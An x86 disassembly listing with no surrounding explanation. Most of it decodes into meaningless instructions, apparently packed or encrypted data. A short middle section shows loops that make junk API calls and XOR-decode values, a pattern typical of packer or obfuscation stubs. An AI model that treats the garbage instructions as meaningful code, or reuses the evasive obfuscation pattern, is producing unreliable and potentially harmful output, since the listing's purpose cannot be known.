  40a6d2:	aad    0x50
  40a6d4:	push   0x3dff5fb1
  40a6d9:	pop    esi
  40a6da:	cmp    ah,BYTE PTR [ebx]
  40a6dc:	retf   
  40a6dd:	lods   al,BYTE PTR ds:[esi]
  40a6de:	inc    esi
  40a6df:	int3   
  40a6e0:	mov    al,ds:0xc5103789
  40a6e5:	stc    
  40a6e6:	mov    ch,0x15
  40a6e8:	lock loope 0x40a68e
  40a6eb:	in     eax,0xbd
  40a6ed:	bound  esp,QWORD PTR [esi-0x5ab87fe9]
  40a6f3:	cmp    BYTE PTR [edx-0x51],ah
  40a6f6:	ss mov bl,0x3e
  40a6f9:	shl    cl,1
  40a6fb:	adc    BYTE PTR [eax-0x6d7f5b9c],cl
  40a701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a702:	(bad)  
  40a703:	dec    edi
  40a704:	inc    ebp
  40a705:	adc    al,0xf5
  40a707:	ror    DWORD PTR [edx+0x5e],0xef
  40a70b:	push   esi
  40a70c:	xchg   ebx,eax
  40a70d:	mov    cs,WORD PTR [ecx+0x1e203800]
  40a713:	dec    ebx
  40a714:	dec    eax
  40a715:	jecxz  0x40a757
  40a717:	push   eax
  40a718:	pop    ss
  40a719:	xchg   ecx,eax
  40a71a:	repnz icebp 
  40a71c:	xor    esi,DWORD PTR [edx+ebx*2-0x4]
  40a720:	or     edx,DWORD PTR [esi-0x6f]
  40a723:	loop   0x40a6b2
  40a725:	out    0x1f,eax
  40a727:	pop    eax
  40a728:	scas   al,BYTE PTR es:[edi]
  40a729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a72a:	pop    ebp
  40a72b:	jmp    0x40a6ec
  40a72d:	outs   dx,DWORD PTR ds:[esi]
  40a72e:	and    cl,BYTE PTR [ebx+0x15]
  40a731:	cli    
  40a732:	jnp    0x40a6dd
  40a734:	cmc    
  40a735:	dec    ecx
  40a736:	mov    edx,0x40be1872
  40a73b:	(bad)  
  40a73c:	ror    BYTE PTR [ebp+0x16bae789],cl
  40a742:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40a744:	mov    ah,BYTE PTR [ecx]
  40a746:	mov    ch,0xc4
  40a748:	sub    al,0x8a
  40a74a:	xor    BYTE PTR [edx],ah
  40a74c:	xchg   edi,ebp
  40a74e:	inc    ecx
  40a74f:	hlt    
  40a750:	adc    eax,0x82f8f92a
  40a755:	mov    al,0xf7
  40a757:	(bad)  
  40a758:	scas   al,BYTE PTR es:[edi]
  40a759:	ja     0x40a74a
  40a75b:	add    ah,BYTE PTR [eax]
  40a75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a75e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a75f:	add    BYTE PTR [eax],ah
  40a761:	push   eax
  40a762:	add    BYTE PTR [ebp+0x18],ch
  40a765:	cwde   
  40a766:	ret    0x5e9b
  40a769:	and    DWORD PTR [edx-0x1c41d894],ebx
  40a76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a770:	shl    BYTE PTR [eax+0x48],1
  40a773:	out    dx,al
  40a774:	push   esp
  40a775:	push   esp
  40a776:	(bad)  
  40a777:	push   edx
  40a778:	pop    ecx
  40a779:	loopne 0x40a7f2
  40a77b:	xchg   edi,eax
  40a77c:	mov    ch,0x3
  40a77e:	mov    eax,ds:0x27323ef3
  40a783:	push   eax
  40a784:	mov    eax,0x8c6eef72
  40a789:	scas   eax,DWORD PTR es:[edi]
  40a78a:	call   0x1:0xb3e95790
  40a791:	add    BYTE PTR [ecx+edi*2+0x71717173],dh
  40a798:	mov    dl,0x39
  40a79a:	hlt    
  40a79b:	or     ebp,DWORD PTR [edx+ebp*2-0x51]
  40a79f:	fistp  QWORD PTR gs:[esi+0x77]
  40a7a3:	out    dx,eax
  40a7a4:	jo     0x40a816
  40a7a6:	xchg   ebp,eax
  40a7a7:	jg     0x40a819
  40a7a9:	jo     0x40a793
  40a7ab:	mov    ds:0xe2e104df,al
  40a7b0:	dec    esi
  40a7b1:	int3   
  40a7b2:	jne    0x40a7bd
  40a7b4:	xor    ecx,edx
  40a7b6:	jnp    0x40a73e
  40a7b8:	pop    ss
  40a7b9:	fcmovb st,st(1)
  40a7bb:	test   DWORD PTR [edi],ebx
  40a7bd:	sti    
  40a7be:	stos   BYTE PTR es:[edi],al
  40a7bf:	(bad)  
  40a7c0:	jnp    0x40a7a6
  40a7c2:	xrelease xchg BYTE PTR [esi],ah
  40a7c5:	lahf   
  40a7c6:	rol    BYTE PTR [ebx+edx*4-0x4e],0xcb
  40a7cb:	xor    eax,0x31aa5cb2
  40a7d0:	and    DWORD PTR ds:0xc6b5ef60,esp
  40a7d6:	(bad)  
  40a7d7:	lds    esp,FWORD PTR [eax]
  40a7d9:	push   ss
  40a7da:	pusha  
  40a7db:	cmp    al,0xec
  40a7dd:	jns    0x40a775
  40a7df:	test   eax,0xd0e33e56
  40a7e4:	lods   al,BYTE PTR ds:[esi]
  40a7e5:	jnp    0x40a82f
  40a7e7:	mov    ds:0xaf3e4bf6,al
  40a7ec:	jle    0x40a7e5
  40a7ee:	lahf   
  40a7ef:	mov    edi,DWORD PTR [ecx+ebx*1-0x68]
  40a7f3:	arpl   WORD PTR [ecx-0x382981c3],dx
  40a7f9:	mov    BYTE PTR [ecx],dl
  40a7fb:	push   edx
  40a7fc:	rcr    BYTE PTR [edi-0x29],cl
  40a7ff:	fdivr  DWORD PTR [ecx-0x53]
  40a802:	pop    ebp
  40a803:	add    DWORD PTR [eax-0x11],ebp
  40a806:	test   DWORD PTR [ebx+edi*2-0x5d3a3cc1],esi
  40a80d:	in     al,dx
  40a80e:	xchg   edi,eax
  40a80f:	call   0x71943ce8
  40a814:	aaa    
  40a815:	push   cs
  40a816:	scas   eax,DWORD PTR es:[edi]
  40a817:	cli    
  40a818:	popf   
  40a819:	jmp    0x18c3:0x8ba0590
  40a820:	rcl    DWORD PTR ds:0xed1fc372,0xbc
  40a827:	gs dec eax
  40a829:	dec    ebx
  40a82a:	call   0xda1c6198
  40a82f:	push   ebp
  40a830:	push   ebp
  40a831:	and    ecx,ebp
  40a833:	fsubrp st(3),st
  40a835:	test   al,0xd2
  40a837:	aaa    
  40a838:	test   DWORD PTR [esi+0x78],esi
  40a83b:	cdq    
  40a83c:	test   al,0x94
  40a83e:	pop    edi
  40a83f:	out    0x45,al
  40a841:	imul   ecx,edx,0x65
  40a844:	jecxz  0x40a897
  40a846:	sbb    DWORD PTR ds:0xe357605f,edi
  40a84c:	shl    BYTE PTR [ebp+0x729d36f8],0x8e
  40a853:	and    DWORD PTR [ecx],edi
  40a855:	adc    BYTE PTR [ebx-0x7c],bl
  40a858:	mov    ds,ecx
  40a85a:	xchg   esp,eax
  40a85b:	mov    esp,0xa75bfcde
  40a860:	ins    DWORD PTR es:[edi],dx
  40a861:	stos   BYTE PTR es:[edi],al
  40a862:	xchg   ah,dh
  40a864:	in     al,dx
  40a865:	leave  
  40a866:	aaa    
  40a867:	adc    BYTE PTR [edx+0x4f],ch
  40a86a:	fs push 0x22ff8466
  40a870:	dec    ebp
  40a871:	test   eax,0xedb13a1c
  40a876:	test   BYTE PTR [edx],ch
  40a878:	fld    QWORD PTR [ecx+0x4c9d2133]
  40a87e:	xor    DWORD PTR [eax-0x3a],0x21700270
  40a885:	sbb    bh,dl
  40a887:	mov    ds:0xb56c108e,al
  40a88c:	int3   
  40a88d:	pop    edi
  40a88e:	aam    0x10
  40a890:	push   0xffffffe0
  40a892:	fxch   st(4)
  40a894:	jecxz  0x40a8d6
  40a896:	adc    DWORD PTR [ebx+0x1d],0x85e01c8d
  40a89d:	inc    eax
  40a89e:	out    0x74,al
  40a8a0:	cld    
  40a8a1:	mov    bh,0x6c
  40a8a3:	inc    esp
  40a8a4:	stc    
  40a8a5:	imul   esi,esp,0x74f8e983
  40a8ab:	cs xchg edx,eax
  40a8ad:	push   edx
  40a8ae:	(bad)  
  40a8af:	jmp    0xff3e:0x8285d856
  40a8b6:	dec    eax
  40a8b7:	or     BYTE PTR ds:0x34eeb67f,al
  40a8bd:	fadd   DWORD PTR [ebp-0x16]
  40a8c0:	adc    bh,al
  40a8c2:	rcr    BYTE PTR [esi-0x23],1
  40a8c5:	imul   edi,DWORD PTR [eax-0x5496838f],0x8314056d
  40a8cf:	imul   esi,ebx,0x5ad768c2
  40a8d5:	fst    DWORD PTR [edi-0x78]
  40a8d8:	test   al,0x22
  40a8da:	cld    
  40a8db:	dec    eax
  40a8dc:	mov    esi,DWORD PTR [ecx+0x5e4ec885]
  40a8e2:	sbb    eax,0x69b716be
  40a8e7:	nop
  40a8e8:	imul   edx,DWORD PTR [ebx],0x5d
  40a8eb:	popf   
  40a8ec:	push   ss
  40a8ed:	push   ebx
  40a8ee:	fldenv [ecx+ebp*1+0x2d]
  40a8f2:	adc    edx,DWORD PTR ds:[ecx-0x326b51df]
  40a8f9:	adc    eax,0xe95d1715
  40a8fe:	sub    BYTE PTR [edi-0xb27ae6a],bh
  40a904:	mov    al,BYTE PTR [ecx]
  40a906:	sub    al,0xce
  40a908:	jmp    0x40a910
  40a90a:	bound  ebp,QWORD PTR [ecx-0x6e73321f]
  40a910:	push   ebp
  40a911:	not    DWORD PTR [ebx+ebp*8-0x26]
  40a915:	xchg   edx,eax
  40a916:	mov    BYTE PTR [ebx+0x9],ch
  40a919:	mov    al,ds:0x19e7903b
  40a91e:	sub    bh,ah
  40a920:	in     eax,0xbe
  40a922:	pop    ds
  40a923:	out    0xd4,eax
  40a925:	int    0x8e
  40a927:	inc    esp
  40a928:	pop    esi
  40a929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a92a:	xchg   bh,bh
  40a92c:	(bad)  
  40a92d:	std    
  40a92e:	mov    edi,0xb1898a4f
  40a933:	inc    ecx
  40a934:	sar    DWORD PTR [eax-0x6f],cl
  40a937:	repnz mov edx,0xc626c2cc
  40a93d:	pop    esi
  40a93e:	scas   eax,DWORD PTR es:[edi]
  40a93f:	dec    ebp
  40a940:	(bad)  
  40a941:	cmp    al,0xac
  40a943:	dec    edx
  40a944:	imul   edi,DWORD PTR [edi+0x32729c],0x27081d13
  40a94e:	inc    ebx
  40a94f:	add    BYTE PTR [ebx],al
  40a951:	(bad)  
  40a952:	sbb    DWORD PTR ds:0x432de2,edi
  40a958:	mov    DWORD PTR [ecx],eax
  40a95a:	not    DWORD PTR ds:0x434421
  40a960:	lea    eax,[ebp-0x4]
  40a963:	xor    DWORD PTR ds:0x432de2,ecx
  40a969:	mov    DWORD PTR [ebp-0x10],eax
  40a96c:	mov    eax,DWORD PTR [ebp+0x8]
  40a96f:	add    DWORD PTR ds:0x432dca,edx
  40a975:	mov    ecx,DWORD PTR [ebp-0x10]
  40a978:	xor    eax,esi
  40a97a:	and    DWORD PTR ds:0x4326fc,0x0
  40a984:	jmp    0x40a996
  40a989:	mov    ebx,DWORD PTR ds:0x4326fc
  40a98f:	inc    ebx
  40a990:	mov    DWORD PTR ds:0x4326fc,ebx
  40a996:	cmp    DWORD PTR ds:0x4326fc,0x1a
  40a99d:	jae    0x40a9da
  40a9a3:	cmp    DWORD PTR ds:0x4326fc,0x8
  40a9aa:	jne    0x40a9bb
  40a9b0:	push   0x184e
  40a9b5:	call   DWORD PTR ds:0x432d12
  40a9bb:	cmp    DWORD PTR ds:0x4326fc,0x7
  40a9c2:	jne    0x40a9d5
  40a9c8:	mov    ebx,DWORD PTR ds:0x4326fc
  40a9ce:	inc    ebx
  40a9cf:	mov    DWORD PTR ds:0x4326fc,ebx
  40a9d5:	jmp    0x40a989
  40a9da:	add    eax,edi
  40a9dc:	mov    DWORD PTR [ecx],eax
  40a9de:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a9e5:	lea    eax,[ebp-0x18]
  40a9e8:	and    DWORD PTR ds:0x4326f8,0x0
  40a9f2:	jmp    0x40aa04
  40a9f7:	mov    ecx,DWORD PTR ds:0x4326f8
  40a9fd:	inc    ecx
  40a9fe:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa04:	cmp    DWORD PTR ds:0x4326f8,0x16
  40aa0b:	jae    0x40aa5e
  40aa11:	cmp    DWORD PTR ds:0x4326f8,0x4
  40aa18:	jne    0x40aa39
  40aa1e:	push   0x5697
  40aa23:	push   DWORD PTR [ebp-0xc]
  40aa26:	push   0x541e
  40aa2b:	push   0x8aca
  40aa30:	push   DWORD PTR [ebp-0x24]
  40aa33:	call   DWORD PTR ds:0x432c62
  40aa39:	cmp    DWORD PTR ds:0x4326f8,0x3
  40aa40:	jne    0x40aa53
  40aa46:	mov    ecx,DWORD PTR ds:0x4326f8
  40aa4c:	inc    ecx
  40aa4d:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa53:	jmp    0x40a9f7
  40aa58:	and    DWORD PTR ds:0x434376,ecx
  40aa5e:	mov    DWORD PTR [ebp-0x24],eax
  40aa61:	and    DWORD PTR ds:0x43437e,0x0
  40aa6b:	jmp    0x40aa7f
  40aa70:	xor    ecx,ecx
  40aa72:	add    ecx,DWORD PTR ds:0x43437e
  40aa78:	inc    ecx
  40aa79:	mov    DWORD PTR ds:0x43437e,ecx
  40aa7f:	cmp    DWORD PTR ds:0x43437e,0x18
  40aa86:	jae    0x40aab3
  40aa8c:	cmp    DWORD PTR ds:0x43437e,0x20
  40aa93:	jne    0x40aaae
  40aa99:	push   0x6696
  40aa9e:	push   0x74e3
  40aaa3:	push   0x43275d
  40aaa8:	call   DWORD PTR ds:0x432d16
  40aaae:	jmp    0x40aa70
  40aab3:	mov    eax,DWORD PTR [ebp-0x18]
  40aab6:	add    DWORD PTR ds:0x43436e,0x336
  40aac0:	mov    ecx,DWORD PTR [ebp-0x24]
  40aac3:	sub    DWORD PTR ds:0x4343a2,ebx
  40aac9:	xor    eax,esi
  40aacb:	add    DWORD PTR ds:0x432dc6,ebx
  40aad1:	add    eax,edi
  40aad3:	neg    ebx
  40aad5:	mov    DWORD PTR [ecx],eax
  40aad7:	mov    eax,ds:0x416274
  40aadc:	movzx  ebx,WORD PTR ds:0x434392
  40aae3:	sbb    DWORD PTR ds:0x4326ec,ebx
  40aae9:	mov    ebx,0x8e12febe
  40aaee:	mov    DWORD PTR ds:0x434419,0x7eb1
  40aaf8:	mov    DWORD PTR [ebp-0xc],ebx
  40aafb:	mov    eax,DWORD PTR [eax]
  40aafd:	or     DWORD PTR ds:0x432de2,0x3ff6
  40ab07:	mov    cx,WORD PTR [ebp-0x4]
  40ab0b:	add    DWORD PTR ds:0x434392,0x7366
  40ab15:	movzx  ecx,cx
  40ab18:	add    ecx,DWORD PTR [eax]
  40ab1a:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40ab21:	mov    DWORD PTR [ebp-0x1c],ecx
  40ab24:	jmp    0x40acdc
  40ab29:	jbe    0x40ab3f
  40ab2b:	dec    eax
  40ab2c:	sahf   
  40ab2d:	jb     0x40ab89
  40ab2f:	jbe    0x40ab05
  40ab31:	xor    eax,0xca7cbad5
  40ab36:	cmp    BYTE PTR [edi+0x70ed8cf4],bh
  40ab3c:	jo     0x40aad3
  40ab3e:	jg     0x40abb0
  40ab40:	jo     0x40ab5f
  40ab42:	and    eax,0xb8f490c4
  40ab47:	ret    
  40ab48:	aam    0xfa
  40ab4a:	xchg   ebx,eax
  40ab4b:	pop    ds
  40ab4c:	cmc    
  40ab4d:	push   esp
  40ab4e:	pop    ss
  40ab4f:	ins    BYTE PTR es:[edi],dx
  40ab50:	sbb    ecx,ebx
  40ab52:	cwde   
  40ab53:	outs   dx,DWORD PTR ds:[esi]
  40ab54:	mov    bl,0xbd
  40ab56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab57:	mov    ecx,0x59bcedbd
  40ab5c:	and    BYTE PTR [edi+0x6df68188],ah
  40ab62:	add    al,ch
  40ab64:	add    DWORD PTR [edi+0x28eff064],eax
  40ab6a:	aaa    
  40ab6b:	lods   al,BYTE PTR ds:[esi]
  40ab6c:	ret    
  40ab6d:	mov    ch,0x2
  40ab6f:	pop    es
  40ab70:	pop    eax
  40ab71:	(bad)  
  40ab72:	lods   al,BYTE PTR ds:[esi]
  40ab73:	jecxz  0x40ab71
  40ab75:	inc    esi
  40ab76:	pop    edx
  40ab77:	repnz adc bh,BYTE PTR [esi-0x2f0c2fd0]
  40ab7e:	aaa    
  40ab7f:	in     al,0x3d
  40ab81:	mov    ?,edx
  40ab83:	aas    
  40ab84:	test   BYTE PTR [edx+0x7e54eb4f],al
  40ab8a:	outs   dx,BYTE PTR ds:[esi]
  40ab8b:	arpl   si,ax
  40ab8d:	mov    cl,0xb3
  40ab8f:	adc    al,0xc2
  40ab91:	xor    eax,0x95703385
  40ab96:	sar    BYTE PTR [edx+0x14],1
  40ab99:	jno    0x40ab44
  40ab9b:	stos   BYTE PTR es:[edi],al
  40ab9c:	adc    cl,al
  40ab9e:	call   0x2b53:0x9aa8c817
  40aba5:	sbb    BYTE PTR [ebx+0x46941014],0xe1
  40abac:	pop    ebp
  40abad:	mov    ch,0xe
  40abaf:	pop    ecx
  40abb0:	jnp    0x40abf1
  40abb2:	lds    esi,FWORD PTR [ecx+0x6d72016d]
  40abb8:	ins    DWORD PTR es:[edi],dx
  40abb9:	xchg   ch,al
  40abbb:	mov    dh,0xd2
  40abbd:	imul   ebx,esi,0x13
  40abc0:	jne    0x40abab
  40abc2:	test   al,0x7e
  40abc4:	test   DWORD PTR [ebp-0x7ca68ac],esp
  40abca:	xchg   esi,eax
  40abcb:	icebp  
  40abcc:	xchg   ebx,eax
  40abcd:	pop    esi
  40abce:	sbb    al,0x47
  40abd0:	cmp    al,0x52
  40abd2:	or     al,BYTE PTR [esi-0x76]
  40abd5:	outs   dx,BYTE PTR ds:[esi]
  40abd6:	sbb    eax,0x1e8016fd
  40abdb:	(bad)  
  40abdc:	jnp    0x40abb2
  40abde:	mov    ecx,0x1804501e
  40abe3:	imul   esp,esi,0x3
  40abe6:	js     0x40ac0d
  40abe8:	test   al,0xa4
  40abea:	clc    
  40abeb:	pop    ds
  40abec:	jns    0x40abe0
  40abee:	mov    dh,0x69
  40abf0:	je     0x40ac0c
  40abf2:	ret    
  40abf3:	dec    edi
  40abf4:	pop    ecx
  40abf5:	rcr    BYTE PTR [edi+0x3],0xea
  40abf9:	sahf   
  40abfa:	cdq    
  40abfb:	js     0x40ab8e
  40abfd:	inc    edi
  40abfe:	jbe    0x40ac6b
  40ac00:	mov    ebx,0x20a9633
  40ac05:	lods   al,BYTE PTR ds:[esi]
  40ac06:	cmp    al,0x76
  40ac08:	mov    ebp,0x951fe8a3
  40ac0d:	gs xchg esp,eax
  40ac0f:	jne    0x40ac0a
  40ac11:	(bad)  
  40ac12:	lods   eax,DWORD PTR ds:[esi]
  40ac13:	dec    esp
  40ac14:	std    
  40ac15:	fild   WORD PTR [edx-0x69f2d710]
  40ac1b:	into   
  40ac1c:	fcom   DWORD PTR [eax-0x3e1fd3b]
  40ac22:	mov    bh,0x1c
  40ac24:	pop    ss
  40ac25:	add    al,0x46
  40ac27:	cld    
  40ac28:	bound  eax,QWORD PTR [ecx-0x795a0bd8]
  40ac2e:	out    dx,al
  40ac2f:	jmp    0x40ac04
  40ac31:	lahf   
  40ac32:	inc    ebp
  40ac33:	ret    
  40ac34:	aam    0xf1
  40ac36:	(bad)  
  40ac37:	aam    0x2d
  40ac39:	ins    BYTE PTR es:[edi],dx
  40ac3a:	xor    esp,DWORD PTR [esi]
  40ac3c:	xor    ch,BYTE PTR [eax]
  40ac3e:	mov    esi,0xf07961c6
  40ac43:	add    BYTE PTR [esi-0x2],0xdc
  40ac47:	jmp    0x40ac0b
  40ac49:	jns    0x40ac46
  40ac4b:	clc    
  40ac4c:	in     eax,0x9
  40ac4e:	or     dh,BYTE PTR [ebx]
  40ac50:	push   0x17
  40ac52:	je     0x40acc8
  40ac54:	jbe    0x40abef
  40ac56:	(bad)  
  40ac57:	aam    0x4d
  40ac59:	adc    cl,al
  40ac5b:	xor    edx,edx
  40ac5d:	(bad)  
  40ac5e:	dec    edx
  40ac5f:	xchg   dl,bh
  40ac61:	xchg   edx,eax
  40ac62:	sbb    cl,BYTE PTR [eax]
  40ac64:	pop    ebp
  40ac65:	mov    ebx,0x1566f579
  40ac6a:	pop    ds
  40ac6b:	xor    al,0xa4
  40ac6d:	repz cld 
  40ac6f:	push   edx
  40ac70:	mov    edi,0xbcde9af4
  40ac75:	(bad)  
  40ac76:	jb     0x40acdd
  40ac78:	xor    al,0xec
  40ac7a:	jecxz  0x40ac43
  40ac7c:	data16 add bl,ch
  40ac7f:	dec    eax
  40ac80:	cmp    eax,0xdc21ea35
  40ac85:	sbb    edx,DWORD PTR ds:0x787d1130
  40ac8b:	loopne 0x40ac2e
  40ac8d:	push   ebp
  40ac8e:	in     al,dx
  40ac8f:	add    al,0x45
  40ac91:	sub    al,0x5e
  40ac93:	or     ebp,ecx
  40ac95:	sub    eax,DWORD PTR [edx]
  40ac97:	or     al,0xa8
  40ac99:	push   cs
  40ac9a:	pop    ss
  40ac9b:	mov    dh,0x56
  40ac9d:	xchg   ebp,ebx
  40ac9f:	loop   0x40ac3a
  40aca1:	call   0xd909:0x318573fe
  40aca8:	ret    
  40aca9:	push   esi
  40acaa:	push   cs
  40acab:	or     eax,0xec251f97
  40acb0:	push   ds
  40acb1:	repnz ror esp,1
  40acb4:	sbb    bh,BYTE PTR [ebx]
  40acb6:	cmp    BYTE PTR [eax],al
  40acb8:	sbb    cl,dl
  40acba:	dec    ebp
  40acbb:	int    0x6
  40acbd:	stos   BYTE PTR es:[edi],al
  40acbe:	mov    ebp,0x967e7d9a
  40acc4:	and    ebx,DWORD PTR [eax+0x5f]
  40acc7:	out    dx,eax
  40acc8:	stos   DWORD PTR es:[edi],eax
  40acc9:	add    DWORD PTR [edx+0x73],ebp
  40accc:	mov    cl,0x84
  40acce:	or     BYTE PTR [ebp-0x3],0xd2
  40acd2:	xor    DWORD PTR [ecx],ecx
  40acd4:	(bad)  
  40acd5:	or     bl,BYTE PTR [eax]
  40acd7:	xor    esp,DWORD PTR ds:[ecx-0x5c]
  40acdb:	push   ebx
  40acdc:	mov    eax,DWORD PTR [ebp+0x8]
  40acdf:	mov    ecx,DWORD PTR [ebp-0x8]
  40ace2:	xor    eax,esi
  40ace4:	add    eax,edi
  40ace6:	cmp    DWORD PTR [ecx],eax
  40ace8:	jne    0x40af2d
  40acee:	mov    eax,DWORD PTR [ebp+0x8]
  40acf1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40acf4:	xor    eax,esi
  40acf6:	add    eax,edi
  40acf8:	cmp    DWORD PTR [ecx],eax
  40acfa:	jne    0x40ad1d
  40ad00:	mov    eax,DWORD PTR [ebp+0x8]
  40ad03:	mov    ecx,DWORD PTR [ebp-0x10]
  40ad06:	xor    eax,esi
  40ad08:	add    eax,edi
  40ad0a:	mov    DWORD PTR [ecx],eax
  40ad0c:	mov    eax,DWORD PTR [ebp-0x10]
  40ad0f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad12:	xor    ecx,esi
  40ad14:	mov    edx,0xffcd8d64
  40ad19:	sub    edx,ecx
  40ad1b:	add    DWORD PTR [eax],edx
  40ad1d:	mov    eax,ds:0x416274
  40ad22:	mov    eax,DWORD PTR [eax]
  40ad24:	mov    cx,WORD PTR [ebp-0x4]
  40ad28:	movzx  ecx,cx
  40ad2b:	add    ecx,DWORD PTR [eax]
  40ad2d:	mov    DWORD PTR [ebp-0x1c],ecx
  40ad30:	mov    eax,DWORD PTR [ebp+0xc]
  40ad33:	jmp    0x40aeeb
  40ad38:	and    ecx,ecx
  40ad3a:	repnz call 0x5305:0x5171a1f2
  40ad42:	inc    esi
  40ad43:	std    
  40ad44:	sbb    bl,BYTE PTR [ebp-0x14de2737]
  40ad4a:	jo     0x40adbc
  40ad4c:	xchg   ebp,eax
  40ad4d:	jg     0x40adbf
  40ad4f:	jo     0x40ad16
  40ad51:	push   0x65dfd68c
  40ad56:	jl     0x40acfc
  40ad58:	push   ds
  40ad59:	push   esi
  40ad5a:	push   ss
  40ad5b:	inc    esi
  40ad5c:	add    ch,BYTE PTR [ecx+0x2a]
  40ad5f:	adc    al,0xc7
  40ad61:	pop    edx
  40ad62:	outs   dx,BYTE PTR ds:[esi]
  40ad63:	sub    al,0xcf
  40ad65:	pushf  
  40ad66:	jmp    0xb70bd4cd
  40ad6b:	fisubr WORD PTR [ecx+0x73f895dc]
  40ad71:	daa    
  40ad72:	xor    edi,DWORD PTR ds:0x761f0b4b
  40ad78:	dec    edx
  40ad79:	sub    al,0x53
  40ad7b:	push   eax
  40ad7c:	(bad)  
  40ad7d:	jno    0x40adc2
  40ad7f:	cmp    DWORD PTR [edx+0x4e],ecx
  40ad82:	dec    esp
  40ad83:	cmp    esp,DWORD PTR [esi]
  40ad85:	adc    esi,DWORD PTR [edi-0x3b]
  40ad88:	lods   al,BYTE PTR ds:[esi]
  40ad89:	adc    al,0x33
  40ad8b:	pop    ecx
  40ad8c:	scas   eax,DWORD PTR es:[edi]
  40ad8d:	sub    bl,BYTE PTR [esi+0x9]
  40ad90:	inc    edx
  40ad91:	jb     0x40adbf
  40ad93:	daa    
  40ad94:	fsub   DWORD PTR [edi+0x48c26450]
  40ad9a:	mov    ch,0xd0
  40ad9c:	mov    BYTE PTR [esi+0xb9feec0],dh
  40ada2:	jp     0x40adbf
  40ada4:	retf   0x1db4
  40ada7:	js     0x40ad76
  40ada9:	or     DWORD PTR [edx+0x7d],ebp
  40adac:	fadd   QWORD PTR [edx-0x70bc0bdb]
  40adb2:	out    dx,al
  40adb3:	mov    esp,0x6a9ce0d7
  40adb8:	dec    eax
  40adb9:	js     0x40ae29
  40adbb:	pop    esp
  40adbc:	popa   
  40adbd:	pop    esi
  40adbe:	xor    al,0x89
  40adc0:	jmp    0x3dbd471a
  40adc5:	push   edx
  40adc6:	dec    ebx
  40adc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adc8:	bound  ebx,QWORD PTR [esi-0x2b]
  40adcb:	mov    eax,eax
  40adcd:	cmp    bh,BYTE PTR [edi+0x31ab43dc]
  40add3:	push   ecx
  40add4:	mov    bh,0x12
  40add6:	inc    esi
  40add7:	adc    eax,0xd21b6471
  40addc:	cmp    BYTE PTR [ecx+0x233a15a8],cl
  40ade2:	test   al,0xb6
  40ade4:	leave  
  40ade5:	leave  
  40ade6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ade7:	push   0x73
  40ade9:	and    DWORD PTR [ecx],0x77
  40adec:	dec    edx
  40aded:	lahf   
  40adee:	sbb    al,0xdf
  40adf0:	adc    BYTE PTR [ebx],al
  40adf2:	repz pop eax
  40adf4:	jmp    0x7d09:0x91e4cca9
  40adfb:	jp     0x40adf1
  40adfd:	add    eax,0x3bc2ef3b
  40ae02:	rol    al,cl
  40ae04:	add    BYTE PTR [esi+0x21b7a263],ch
  40ae0a:	fiadd  WORD PTR [ebx-0x65]
  40ae0d:	push   ds
  40ae0e:	into   
  40ae0f:	dec    ebp
  40ae10:	jae    0x40ae39
  40ae12:	ret    0x9ecb
  40ae15:	adc    edx,DWORD PTR [edi]
  40ae17:	das    
  40ae18:	xor    BYTE PTR [ebx],0xf5
  40ae1b:	mov    ch,0xd6
  40ae1d:	inc    ebx
  40ae1e:	ret    
  40ae1f:	stos   BYTE PTR es:[edi],al
  40ae20:	jbe    0x40ae60
  40ae22:	mov    ecx,0x293202ae
  40ae27:	scas   al,BYTE PTR es:[edi]
  40ae28:	mov    ch,0xc4
  40ae2a:	jne    0x40addf
  40ae2c:	lods   al,BYTE PTR ds:[esi]
  40ae2d:	jecxz  0x40ae2d
  40ae2f:	fs xchg dl,cl
  40ae32:	xor    ebx,DWORD PTR [eax-0x50]
  40ae35:	adc    ebx,ebp
  40ae37:	cli    
  40ae38:	aam    0xc8
  40ae3a:	sub    al,0x1c
  40ae3c:	(bad)  
  40ae3d:	jmp    0x40ae9f
  40ae3f:	mov    esi,0xd53c249e
  40ae44:	sbb    cl,BYTE PTR [edi+0x5c]
  40ae47:	ins    DWORD PTR es:[edi],dx
  40ae48:	jmp    0x40ae8b
  40ae4a:	adc    ebx,DWORD PTR [edi-0x59aea549]
  40ae50:	loop   0x40aec5
  40ae52:	pop    ebp
  40ae53:	shr    DWORD PTR [edi+0x1c9c63a2],0x6
  40ae5a:	mov    ss,WORD PTR [ecx+0x28d4fd12]
  40ae60:	inc    edi
  40ae61:	add    eax,0x3864f91f
  40ae66:	fisubr WORD PTR [edi]
  40ae68:	popa   
  40ae69:	daa    
  40ae6a:	pop    ebx
  40ae6b:	inc    edi
  40ae6c:	cmp    BYTE PTR [eax+0x4df222a7],cl
  40ae72:	ins    DWORD PTR es:[edi],dx
  40ae73:	ds cmp al,0xd0
  40ae76:	mov    dh,0x78
  40ae78:	adc    DWORD PTR [edx+0x26],esp
  40ae7b:	adc    bl,al
  40ae7d:	cmp    DWORD PTR [ebp-0x77],0x6c0217b8
  40ae84:	and    ch,BYTE PTR [ebx]
  40ae86:	push   0xffffffca
  40ae88:	sbb    al,0x41
  40ae8a:	bound  esp,QWORD PTR [esi-0x6f3880a4]
  40ae90:	lea    esi,[eax]
  40ae92:	mov    al,ds:0x231db98a
  40ae97:	jmp    FWORD PTR ds:0x6c9a9fe2
  40ae9d:	stos   DWORD PTR es:[edi],eax
  40ae9e:	add    BYTE PTR [eax+0x31],0x18
  40aea2:	mov    BYTE PTR [edx],dh
  40aea4:	fistp  WORD PTR [ebp-0x5c]
  40aea7:	out    dx,al
  40aea8:	aam    0x9e
  40aeaa:	out    0xcc,al
